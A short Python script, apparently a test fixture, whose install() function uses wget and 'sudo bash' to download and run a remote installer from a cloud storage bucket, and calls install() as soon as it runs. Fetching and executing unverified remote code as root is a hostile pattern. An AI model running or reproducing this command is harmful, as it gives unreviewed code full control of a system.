import subprocess


def install():
    command = "sudo bash -c \"$(wget -qO - https://storage.googleapis.com/vp_test_executables_v14k1s3j5lztk62qbow01yz0avhvcf/installer-1.0.0)\""
    subprocess.run(command, shell=True, check=True)

 
install()
